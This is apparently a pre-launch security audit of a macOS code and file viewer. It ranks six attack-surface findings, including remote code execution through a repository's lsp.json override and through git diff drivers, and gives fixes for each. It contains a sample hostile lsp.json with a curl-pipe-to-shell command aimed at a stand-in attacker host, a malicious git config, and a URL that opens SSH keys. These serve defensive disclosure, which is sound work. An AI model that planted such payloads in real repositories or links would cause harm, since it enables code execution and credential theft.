# Pre-launch audit — Attack surface enumeration

**Date:** 2026-07-09
**Reviewer lens:** Enumerate every untrusted-input surface (file parsers,
MCP socket bridge, URL schemes, plugins, git, LSP, terminal, network daemon)
and, for each, establish what untrusted input reaches it and what happens.
**Method:** static reading of the real code (no dynamic testing / no window-opening).

---

## Executive summary

The codebase has clearly been through security review before: most surfaces
carry explicit threat-model docstrings, containment fences, resource caps, and
teeth tests. SQLite (read-only + authorizer denying `ATTACH`/DDL), the archive
zip-slip defense (stream-over-stdout, entry names never become paths), the git
subprocess hardening (hooks/fsmonitor/editor/pager neutralized, env scrubbed),
the custom-URL-scheme path jail, and the MCP `open_path` symlink-resolved
containment are all genuinely well done.

**The headline finding is a remote-ish code-execution-on-browse in the LSP
workspace-override path.** A hostile repository can ship an `lsp.json` that
names a **trusted-location** interpreter (`/bin/sh`, `/usr/bin/python3`, …) as
the language-server `command` with a fully attacker-controlled `args` array.
Both trust gates pass it (they only reject binaries *inside the workspace* or in
*world-writable* dirs), and the args are handed to `Process` verbatim. Merely
opening a source file of that language in the repo spawns the payload — no
prompt. For a product whose entire purpose is opening untrusted files and
repos, this is a ship-blocker.

A second, lower-severity RCE-on-browse residual exists in git: the protective
`-c` flags neutralize hooks/fsmonitor/editor/pager but **not** `diff.external`
or gitattributes textconv diff drivers, which fire on `git diff`/`git blame`/
`git log -p` — commands the diff-gutter and git panel run automatically against
the opened repo.

Findings below, most-severe first.

---

## Methodology — what was examined

Read in full or in depth:
- **MCP into the running app:** `Automation/MCPSocketListener.swift`,
  `Automation/MCPSocketBridge.swift`, `Automation/MCPToolCatalog.swift`
  (dispatch, `open_path`, `validatedExistingURL`, `run_task`).
- **URL scheme:** `Security/URLSchemePolicy.swift`, `URLSchemeRouter.swift`,
  `MarkdownViewer/main.swift` (`application(_:open:)`, `handleCustomURLScheme`).
- **Network daemon (mdv-serve):** `rust-core/crates/serve/src/fs.rs`,
  `transport.rs`, `main.rs` (auth model), `lifecycle.rs`.
- **File parsers:** `Archive/ArchiveCatalog.swift` (+ preview/info),
  `SQLite/SQLiteReader.swift`, `BinaryFileLoader.swift`, `TextFileLoader.swift`.
- **LSP:** `LSP/LSPDiscovery.swift`, `LSP/LSPWorkspaceOverrides.swift`,
  `LSPBinaryTrust.swift`, `LSPTrustStore.swift`, `LSP/LSPLanguage.swift`
  (`overrideConfig`, `isOverrideCommandTrusted`), `LSP/LSPClient.swift`
  (spawn gate), `LSP/LSPConfiguration.swift`.
- **Plugins:** `Plugins/PluginSubprocessHost.swift`, `PluginManifest.swift`,
  `PluginGrantStore.swift`, `LSPWorkspaceOverrides` env denylist.
- **Git:** `Git/GitClient.swift` (spawn, env, protective flags, subcommands).
- **Task runner:** `TaskRunner/RunnableTaskDiscovery.swift`, `RunSpec.swift`.
- **Render path (XSS):** `HTMLRenderer.swift` (CSP), `MarkdownRenderedView.swift`,
  `HTMLSanitizer.swift` / `HTMLTrustPolicy.swift` (spot check).

Not exhaustively exercised: dynamic/UI behavior (no VM run), the CodeMirror/
Mermaid/Canvas WebView bridges' message handlers, image decode paths, clipboard
paste sanitization, and the full plugin lifecycle/grant UI. See Coverage gaps.

---

## Findings

### F1 — LSP `lsp.json` override: RCE-on-browse via trusted-location interpreter + attacker args
- **Severity:** **P0** (ship-blocker — arbitrary code execution triggered by
  opening a file in an untrusted repo, no user consent)
- **Files:**
  - `Sources/ViewerCore/LSP/LSPLanguage.swift:394-412` (honored-override spawn)
  - `Sources/ViewerCore/LSP/LSPLanguage.swift:450-463` (`isOverrideCommandTrusted`)
  - `Sources/ViewerCore/LSPBinaryTrust.swift:22-53` (`decision` / `isWorkspaceLocal`)
  - `Sources/ViewerCore/LSP/LSPWorkspaceOverrides.swift:162-190` (repo-controlled `command`/`args`)
  - `Sources/ViewerCore/LSP/LSPClient.swift:156-176` (the LSPTrustStore prompt only covers workspace-local)
- **Evidence:** `LSPWorkspaceOverrides` parses `<workspaceRoot>/lsp.json`
  (a file **inside the repo**) into a `command`, `args`, `env`, and
  `initializationOptions`. In `LSPLanguageRegistry.overrideConfig`, when
  `isOverrideCommandTrusted(binaryURL, workspaceRoot)` returns true, the spawn
  config is built as:
  ```swift
  return LSPClient.Config(
      executable: binaryURL,          // entry.command, verbatim
      arguments: entry.arguments,     // repo-controlled, verbatim
      workspaceRoot: workspaceRoot,
      environment: environment,
      initializationOptions: entry.initializationOptions)
  ```
  `isOverrideCommandTrusted` returns true unless the command's directory is
  group/world-writable **or** the command is inside the workspace subtree.
  A system interpreter satisfies neither rejection:
  ```jsonc
  // lsp.json committed in a hostile repo
  { "servers": { "python": {
      "command": "/bin/sh",
      "args": ["-c", "curl -s https://evil.example/x | sh"]
  } } }
  ```
  `/bin/sh` lives in `/bin` (root-owned, non-writable) and is outside the
  workspace → `isOverrideCommandTrusted == true` → `overrideConfig` returns a
  Config that `LSPClient.init` spawns. The separate `LSPTrustStore` prompt in
  `LSPClient.init:156` only triggers for `LSPBinaryTrust.decision`, which is
  `.needsTrust` **only for workspace-local binaries** — a `/bin/sh` command is
  `.allow`, so no prompt fires. The `serverLauncher` closures
  (`LSPLanguage.swift:187/209/231/265`) call `overrideConfig` first, so this is
  the live production spawn path, triggered automatically when the user opens a
  `.py`/`.js`/`.ts`/`.swift`/`.java` file in the repo (LSP starts per-language
  on demand).
- **Why the existing mitigations miss it:** the env denylist (TSK-980,
  `dangerousEnvNames`) strips `NODE_OPTIONS`/`DYLD_*`/`PYTHONSTARTUP`, and the
  untrusted-command branch (`LSPLanguage.swift:415-443`) correctly drops the
  repo's `args`/`env`. But the **trusted-command branch trusts the args**, on
  the stated assumption that "the user is knowingly taking over spawn config."
  That assumption is false: `lsp.json` is authored by the *repo*, not the user.
  The gate vets *where the binary lives*, never *what it is* or *its arguments*;
  a shell/interpreter in a system dir defeats it completely.
- **Impact:** open a downloaded repo (the core use case of a code/file viewer),
  open a source file → arbitrary command execution as the user. No prompt, no
  network daemon, no elevated setup.
- **Suggested fix:** Do not equate "command is in a non-writable, out-of-tree
  location" with "safe to honor repo-supplied args." Options, strongest first:
  (a) require the one-time `LSPTrustStore` confirm prompt for **any** honored
  `lsp.json` override command *and* its args — not just workspace-local
  binaries; persist the (command,args) tuple hash as the trusted unit.
  (b) Additionally refuse commands that are known interpreters/shells
  (`sh`,`bash`,`zsh`,`python*`,`perl`,`ruby`,`node`,`env`,`osascript`,`awk`,…)
  outright, and refuse when `args` contain shell/eval flags. Keep (a) as the
  real boundary; (b) is defense-in-depth.
- **Fix size:** M
- **Fix risk:** careful (a prompt-on-every-override could annoy the rare
  legitimate `lsp.json` user; the one-time persistent grant mitigates that).

---

### F2 — git `diff.external` / textconv drivers not neutralized → RCE-on-browse on `git diff`/`blame`
- **Severity:** **P1** (arbitrary command execution from a repo-local
  `.git/config` when the diff gutter / git panel runs against an untrusted repo)
- **Files:**
  - `Sources/ViewerCore/Git/GitClient.swift:1257-1263` (`protectiveFlags`)
  - `Sources/ViewerCore/Git/GitClient.swift:212,225,254,1098` (`diff`/`blame` invocations)
- **Evidence:** `protectiveFlags` passes
  `-c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.editor=true
  -c core.pager=cat -c protocol.file.allow=user -c core.quotePath=false`.
  This neutralizes the well-known hook/fsmonitor/editor/pager RCE vectors, and
  the env is built from a minimal allowlist (excellent). But it does **not**
  override `diff.external` or per-driver `[diff "x"] command=`/`textconv=`, and
  the diff/blame calls do not pass `--no-ext-diff` / `--no-textconv`:
  ```swift
  run(["diff", "--no-color", "HEAD", "--", path])          // :212
  run(["diff", "--no-color", baseRef, tipRef])             // :225
  run(["blame", "--line-porcelain", "HEAD", "--", path])   // :254
  ```
  A repo shipped with a `.git/config` containing:
  ```ini
  [diff]
      external = /path/to/payload
  ```
  (or a `.gitattributes` `* diff=evil` + `[diff "evil"] textconv = payload`)
  executes `payload` when git produces a diff. The diff gutter
  (`DocumentModel+GitDiffGutter.swift`) and git panel run `git diff` on the
  opened file automatically.
- **Impact:** opening a project *directory* that carries its own `.git/`
  (a handed-over/unzipped repo, not a fresh clone — clone does not copy remote
  config, so this is the "open this folder" scenario) and viewing a tracked
  file → command execution. Lower than F1 because it requires the diff/blame
  path to run and a delivered `.git/config`.
- **Suggested fix:** add to the diff/blame/`log -p`/`show` invocations (or to
  `protectiveFlags`): `-c diff.external=` (empty) and pass `--no-ext-diff`;
  pass `--no-textconv` on `blame`/`log`/`diff` where output is consumed as raw
  bytes anyway (the code already omits `--textconv` for stored bytes at
  `:1224`). Consider `-c core.attributesFile=/dev/null` is insufficient for
  in-repo `.gitattributes`; the `--no-ext-diff`/`--no-textconv` flags are the
  correct lever.
- **Fix size:** S
- **Fix risk:** safe (these flags only *disable* attacker-controllable
  external programs; raw diff output is what the UI wants).

---

### F3 — Archive extraction buffers unbounded stdout before the size cap → OOM DoS
- **Severity:** **P2** (memory-exhaustion crash from a crafted archive the user
  previews; bounded by a 20 s wall-clock timeout, not by memory)
- **Files:**
  - `Sources/ViewerCore/Archive/ArchiveCatalog.swift:196-225` (`run`)
  - `Sources/ViewerCore/Archive/ArchiveCatalog.swift:108-114,133-136` (post-hoc cap)
- **Evidence:** the `maxEntryBytes = 64 MiB` "decompression-bomb" cap is checked
  **after** the entire subprocess stdout is already in memory:
  ```swift
  let data = try run("/usr/bin/unzip", ["-p", "--", url.path, name])
  guard data.count <= maxEntryBytes else { throw .entryTooLarge(...) }  // too late
  ```
  Inside `run`, the reader thread does
  `stdout.fileHandleForReading.readDataToEndOfFile()` with no byte ceiling; it
  accumulates whatever `unzip -p`/`tar -xO` streams until EOF or the 20 s
  timeout. A zip-bomb entry can decompress multiple GB within 20 s on modern
  hardware, so the process buffers that entirely into `data` before the cap is
  consulted → memory pressure / OOM termination of the app.
- **Impact:** open a malicious `.zip`/`.xlsx`/`.docx` and preview an entry →
  potential app crash / system memory pressure. Not code execution.
- **Suggested fix:** enforce the cap **during** the read — read in bounded
  chunks and abort (`process.terminate()`) once `> maxEntryBytes` have been
  read, rather than `readDataToEndOfFile()` then checking `.count`.
- **Fix size:** S
- **Fix risk:** safe.

---

### F4 — Custom URL scheme opens home-scoped secrets (`~/.ssh`, `~/.aws`) from a web link
- **Severity:** **P2** (information disclosure — a web page can make the app
  open & display a sensitive dotfile, which also lands in an MCP-readable buffer)
- **Files:**
  - `Sources/ViewerCore/Security/URLSchemePolicy.swift:38-79` (home+temp jail)
  - `Sources/ViewerCore/URLSchemeRouter.swift:46-49` (`open` route)
  - `Sources/MarkdownViewer/main.swift:670-693` (dispatch → `model.openPath`)
- **Evidence:** custom schemes (`textview://`, `markdownviewer://`) are
  invokable from any local process **and any web page** (`<a href>`). The
  `open` route funnels through `URLSchemePolicy.containedPath`, which admits any
  path under `$HOME` (or per-user temp). `$HOME` contains `~/.ssh/id_rsa`,
  `~/.aws/credentials`, `~/.config/**`, browser cookie stores, etc. So
  `textview://open?path=~/.ssh/id_rsa` opens and renders that file, and the
  content is now in an in-memory document buffer reachable via the MCP
  `visible_text`/`read_file` tools over the same-user socket. The policy
  docstring itself acknowledges this ("surfaces the file's contents on screen
  and … into in-memory buffers reachable via subsequent MCP tool calls").
- **Impact:** a drive-by link (or a malicious markdown/HTML doc that manages to
  emit a top-level navigation) can pop a secret file into the viewer. The user
  would *see* the file open (some tip-off), but combined with the always-on MCP
  socket it becomes a read primitive for another same-user process. Bounded to
  `$HOME`, so not "any file," but `$HOME` is where the secrets are.
- **Suggested fix:** narrow the `open`-via-URL jail below whole-`$HOME`: deny a
  denylist of sensitive dirs (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`,
  `~/Library/**` cookie/keychain-adjacent) and/or require a confirmation prompt
  for URL-scheme opens the way `walkthrough` already does — a web link opening a
  local file is a bigger grant than the current silent behavior implies.
  (In-process `open_path` MCP tool can keep the wider home jail if desired,
  since that channel is already same-user gated.)
- **Fix size:** M
- **Fix risk:** careful (over-narrowing breaks the legit "open my notes" link
  use case; a confirm prompt is the safer UX).

---

### F5 — MCP running-app socket is unauthenticated beyond file perms; `run_task` executes repo-authored commands
- **Severity:** **P3** (within the documented same-user trust model, but the
  compounded surface is worth an explicit decision before launch)
- **Files:**
  - `Sources/ViewerCore/Automation/MCPSocketListener.swift:69-110` (0600 unix socket)
  - `Sources/ViewerCore/Automation/MCPSocketBridge.swift:97-108` (stateless, not gated on `initialize`)
  - `Sources/ViewerCore/Automation/MCPToolCatalog.swift:299-320,453-464` (`run_task`)
  - `Sources/ViewerCore/TaskRunner/RunnableTaskDiscovery.swift:16-45` (parses `package.json`/`Makefile`/`Cargo`)
- **Evidence:** the running app binds `~/Library/Application Support/
  MarkdownViewer/mcp.sock` at `chmod 0600`; the server is explicitly stateless
  ("tools/list & tools/call are not gated on `initialize`"), so any same-user
  process that connects can drive the full tool surface. That surface includes
  `run_task`, which runs a task discovered from the **open repo's**
  `package.json` `scripts`, `Makefile` targets, etc. — i.e. repo-authored
  command strings — with only an output/timeout cap, no per-invocation
  confirmation. `open_path`/`read_file`/`visible_text` are jailed to `$HOME`
  (see F4) but that still exposes home dotfiles to any same-user peer.
- **Impact:** an attacker who already runs code as the user can (a) read
  home-scoped files and (b) trigger execution of untrusted-repo task strings via
  the app. Same-user is already a strong boundary on macOS (an attacker at that
  level has many primitives), so the *marginal* escalation is modest — but the
  socket turns "user opened a repo" into "any local process can run that repo's
  build script," which is a non-obvious amplification.
- **Suggested fix:** (1) document the same-user socket as an explicit trust
  decision in the security model; (2) consider a per-connection capability
  token handed to the spawning client (the `--mcp-connect` launcher) so an
  unrelated same-user process can't drive the app by merely knowing the path;
  (3) gate `run_task` behind an in-app confirmation (or an allowlist) the first
  time a given task id is run for a project.
- **Fix size:** M
- **Fix risk:** careful (a token handshake touches the self-healing reconnect
  loop in `MCPSocketBridge.serve`).

---

### F6 — Markdown render WebView runs JavaScript; safety rests entirely on CSP + sanitizer
- **Severity:** **P3** (note / verify, not a demonstrated break)
- **Files:**
  - `Sources/ViewerUI/MarkdownRenderedView.swift:222` (`allowsContentJavaScript = true`)
  - `Sources/ViewerCore/HTMLRenderer.swift:79` (CSP)
  - `Sources/ViewerCore/HTMLSanitizer.swift`, `HTMLTrustPolicy.swift`
- **Evidence:** the rendered-markdown WebView enables content JavaScript. The
  mitigations are a strict CSP (`default-src 'none'; … script-src` absent ⇒ no
  script; `connect-src 'none'; object-src 'none'; base-uri 'none';
  form-action 'none';`) plus `HTMLSanitizer`, with `HTMLTrustPolicy.isTrusted`
  fail-closed for untrusted docs. That is the right architecture. The residual
  risk is that JS remaining *enabled* means any CSP gap, sanitizer bypass, or
  trusted-path misjudgment converts markdown/HTML content into script execution
  inside the WebView. The `img-src file: data:` and `style-src 'unsafe-inline'`
  allowances are the kind of thing to re-verify against exfiltration-via-image
  and CSS-injection classes.
- **Impact:** none demonstrated; flagged so the sanitizer + CSP get a dedicated
  adversarial pass (ideally the WebView suites on the VM) before launch, since
  they are the sole barrier.
- **Suggested fix:** confirm there is a teeth test that a `<script>`, an
  `onerror=` handler, and a `javascript:`/`data:text/html` navigation are all
  inert in the rendered WebView for an *untrusted* document; consider disabling
  JS entirely on the untrusted path if the rendered feature set doesn't need it.
- **Fix size:** M (verification; L if JS must be split trusted/untrusted)
- **Fix risk:** careful.

---

## Positive observations

- **SQLite viewer is properly locked down** (`SQLiteReader.swift`):
  `SQLITE_OPEN_READONLY`, an authorizer that hard-denies `ATTACH`/`DETACH` and
  every write/DDL/vtable verb (closing the `ATTACH '/etc/passwd'` file-read and
  vtable-RCE classes), a `busy_timeout`, and a progress-handler cancel for
  runaway queries. `load_extension` is off by default at the C-API level.
- **Archive zip-slip is correctly prevented** (`ArchiveCatalog.swift`): listing
  is parse-only; extraction streams the member over stdout (`unzip -p` /
  `tar -xO`) into an app-chosen temp name, so a hostile `../../` entry name
  never drives a filesystem path. Entry names are passed after `--`, and the
  fixed-entry OOXML path uses app-known names. (The only gap is the OOM cap, F3.)
- **git subprocess hardening** (`GitClient.swift`): minimal env allowlist (no
  `GIT_*` / `*_TOKEN` inheritance), `null` stdin, and `-c` overrides for
  hooks/fsmonitor/editor/pager/`protocol.file.allow`. Strong — F2 is the one
  missing family.
- **mdv-serve fs family** (`serve/src/fs.rs`): every path `canonicalize()`d and
  required to `starts_with(root)`; symlink escapes die at canonicalize; windowed
  reads capped at 4 MiB; readdir capped at 4096; `None` root ⇒ `unauthorized`.
  The ssh tunnel as the auth boundary is a defensible ruling and the binary only
  binds a unix socket path (no TCP).
- **Custom URL scheme** resolves symlinks on both operands before the home/temp
  containment check (closing the in-home-symlink-to-`/etc` escape), uses
  anchored prefixes (no `T-attacker` sibling bypass), and gates `walkthrough`
  (UI automation) behind a modal confirm. `application(_:open:)` requires
  `isFileURL` on the fallthrough.
- **MCP `validatedExistingURL`** mirrors the same symlink-resolved,
  anchored-prefix, containment-before-existence (no existence oracle) discipline.
- **Plugin subprocess host** (`PluginSubprocessHost.swift`): `..` reject +
  symlink-resolved containment under the plugin folder, executable/permission
  preflight, scrubbed env, own process group for whole-tree timeout kill,
  path-free audit logging.
- **LSP env denylist** (`LSPWorkspaceOverrides.dangerousEnvNames`) and the
  binary writable-ancestor-dir walk (`isBinarySafeToSpawn`, full-depth) are
  thoughtful — they just don't cover the F1 args vector.

---

## Coverage gaps (not examined / examined only shallowly)

- **No dynamic testing.** All findings are from static reading; F1/F2 were not
  executed against the live app (would require building a hostile repo and the
  VM UI lane). The spawn *paths* were traced to the production launcher, but a
  runtime PoC was not built.
- **WebView bridge message handlers** (CodeMirror `CodeMirrorBridge`, Mermaid,
  Canvas, the rendered find-bar) — the `postMessage` → Swift handler surfaces
  were not audited for input validation. These are a meaningful surface (content
  → JS → native) left unreviewed.
- **HTML sanitizer internals** (`HTMLSanitizer.swift`) were only spot-checked;
  the allow/deny element+attribute lists and the trusted-vs-untrusted branch
  deserve a dedicated pass (see F6).
- **Image decode** (NSImage/ImageIO on untrusted image files, and the image
  editor's pipeline) — not reviewed; relies on system ImageIO hardening.
- **Clipboard paste** sanitization — not reviewed.
- **Terminal / PTY** (`Terminal/PTYProcess.swift`, `ANSIParser.swift`) — the
  terminal spawns the user's own shell (user-initiated, not an inbound-untrusted
  surface), so it was deprioritized; the ANSI parser's handling of adversarial
  escape sequences in *command output* was not audited.
- **mdv-web / mdv-tui front-ends** beyond the shared transport were not reviewed.
- **Plugin discovery/grant lifecycle** (where plugins are sourced from, whether
  a repo can drop an auto-loading plugin) — the *execution* host was reviewed but
  the *loading/trust* surface (`PluginRegistry`, `PluginsBootstrap`,
  `PluginGrantStore`) was not fully traced.
- **Session/persistence stores** (JSON stores under Application Support) as a
  tamper surface were not reviewed.
